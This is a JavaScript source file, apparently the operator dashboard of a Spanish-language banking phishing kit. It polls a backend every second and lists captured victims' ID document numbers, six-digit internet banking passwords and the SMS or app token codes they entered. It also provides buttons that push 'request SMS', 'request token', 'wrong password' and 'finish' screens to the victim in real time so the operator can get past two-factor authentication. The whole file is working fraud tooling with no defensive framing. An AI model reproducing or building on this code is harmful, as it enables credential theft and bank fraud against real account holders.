document.addEventListener("DOMContentLoaded", () => {
  const container = document.querySelector("#adm-feed-container");
  const emptyState = document.querySelector("#adm-empty-state");
  const statTotal = document.querySelector("#stat-total");
  const statWaiting = document.querySelector("#stat-waiting");
  const statLastTime = document.querySelector("#stat-last-time");
  const statLastDoc = document.querySelector("#stat-last-doc");

  async function fetchSessions() {
    try {
      const res = await fetch("/api/sessions");
      if (res.ok) {
        return await res.json();
      }
    } catch (e) {
      console.error("Error fetching sessions:", e);
    }
    return [];
  }

  async function sendCommand(sessionId, command) {
    try {
      await fetch("/api/command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId, action: command })
      });
      await renderFeed();
    } catch (e) {
      console.error("Error sending command:", e);
    }
  }

  async function renderFeed() {
    const sessions = await fetchSessions();
    
    // Stats update
    statTotal.textContent = sessions.length;
    const waitingCount = sessions.filter(s => !s.status || s.status === "SPINNER" || s.status === "WAITING").length;
    statWaiting.textContent = waitingCount;

    if (sessions.length > 0) {
      const last = sessions[0];
      statLastTime.textContent = last.time || "--:--";
      statLastDoc.textContent = `${last.docType}: ${last.docNumber}`;
    }

    if (sessions.length === 0) {
      container.innerHTML = "";
      container.appendChild(emptyState);
      emptyState.hidden = false;
      return;
    }

    emptyState.hidden = true;
    container.innerHTML = "";

    sessions.forEach(session => {
      const card = document.createElement("div");
      const isWaiting = !session.status || session.status === "SPINNER" || session.status === "WAITING";
      card.className = `adm-session-card ${isWaiting ? "is-waiting" : ""}`;

      let badgeHTML = `<span class="adm-status-badge badge-spinner"><span class="adm-pulse-dot"></span> EN SPINNER (ESPERANDO)</span>`;
      if (session.status === "SMS") {
        badgeHTML = `<span class="adm-status-badge badge-sms">PEDIDO CÓDIGO SMS</span>`;
      } else if (session.status === "TOKEN") {
        badgeHTML = `<span class="adm-status-badge badge-token">PEDIDO TOKEN APP</span>`;
      } else if (session.status === "ERROR") {
        badgeHTML = `<span class="adm-status-badge badge-error">CLAVE INCORRECTA (ERROR)</span>`;
      } else if (session.status === "SUCCESS") {
        badgeHTML = `<span class="adm-status-badge badge-success">FINALIZADO / ÉXITO</span>`;
      }

      card.innerHTML = `
        <div class="adm-session-top">
          <div>
            <span class="adm-session-time">Capturado: ${session.time || "Hace un momento"}</span>
          </div>
          <div>${badgeHTML}</div>
        </div>

        <div class="adm-cred-grid">
          <div class="adm-cred-box">
            <span class="adm-cred-label">Documento (${session.docType || "DNI"})</span>
            <div class="adm-cred-val-wrap">
              <span class="adm-cred-val">${session.docNumber || "---"}</span>
              <button type="button" class="adm-copy-btn" title="Copiar Documento" onclick="navigator.clipboard.writeText('${session.docNumber}')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              </button>
            </div>
          </div>

          <div class="adm-cred-box">
            <span class="adm-cred-label">Clave Internet (6 dígitos)</span>
            <div class="adm-cred-val-wrap">
              <span class="adm-cred-val" style="color: #10B981;">${session.password || "------"}</span>
              <button type="button" class="adm-copy-btn" title="Copiar Clave" onclick="navigator.clipboard.writeText('${session.password}')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              </button>
            </div>
          </div>
        </div>

        ${session.capturedCode ? `
        <div class="adm-cred-box" style="margin-bottom: 20px; background: rgba(59, 130, 246, 0.1); border-color: rgba(59, 130, 246, 0.3);">
          <span class="adm-cred-label" style="color:#60A5FA;">Código Ingresado por Víctima (${session.codeType || "SMS/Token"})</span>
          <div class="adm-cred-val-wrap">
            <span class="adm-cred-val" style="color:#60A5FA; font-size:1.6rem;">${session.capturedCode}</span>
            <button type="button" class="adm-copy-btn" onclick="navigator.clipboard.writeText('${session.capturedCode}')">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
          </div>
        </div>
        ` : ''}

        <div class="adm-actions-panel">
          <div class="adm-actions-title">Enviar Comando a la Pantalla del Usuario</div>
          <div class="adm-cmd-grid">
            <button type="button" class="adm-cmd-btn cmd-sms" data-cmd="SMS" data-id="${session.id}">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
              Pedir SMS
            </button>
            <button type="button" class="adm-cmd-btn cmd-token" data-cmd="TOKEN" data-id="${session.id}">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
              Pedir Token Digital
            </button>
            <button type="button" class="adm-cmd-btn cmd-error" data-cmd="ERROR" data-id="${session.id}">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
              Clave Incorrecta (Error)
            </button>
            <button type="button" class="adm-cmd-btn cmd-finish" data-cmd="SUCCESS" data-id="${session.id}">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
              Aprobar / Finalizar
            </button>
          </div>
        </div>
      `;

      container.appendChild(card);
    });

    document.querySelectorAll(".adm-cmd-btn").forEach(btn => {
      btn.addEventListener("click", () => {
        const id = btn.dataset.id;
        const cmd = btn.dataset.cmd;
        sendCommand(id, cmd);
      });
    });
  }

  document.querySelector("#btn-clear-all").addEventListener("click", async () => {
    if (confirm("¿Estás seguro de borrar todo el historial de capturas?")) {
      await fetch("/api/sessions", { method: "DELETE" });
      await renderFeed();
    }
  });

  document.querySelector("#btn-refresh").addEventListener("click", renderFeed);

  setInterval(renderFeed, 1000);
  renderFeed();
});
